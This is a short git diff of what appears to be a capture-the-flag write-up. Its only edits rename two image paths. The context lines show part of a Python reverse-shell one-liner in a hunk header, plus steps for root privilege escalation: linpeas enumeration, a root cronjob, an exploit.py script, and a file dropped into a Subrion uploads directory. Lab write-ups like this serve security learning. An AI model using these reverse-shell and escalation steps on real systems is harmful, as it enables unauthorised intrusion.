@@ -81,7 +81,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 I ran `linpeas.sh` on the machine to enumerate for me, and it picked up on cronjobs running as the `root` user:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (9).png" alt=""><figcaption></figcaption></figure>
 
 Here's the content of the file:
 
@@ -139,6 +139,6 @@ $ python3 exploit.py
 
 Afterwards, transfer it to the `/var/www/html/subrion/uploads` directory and wait for a bit. Once the cronjob runs, we will get a reverse shell as `root`:
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (9).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
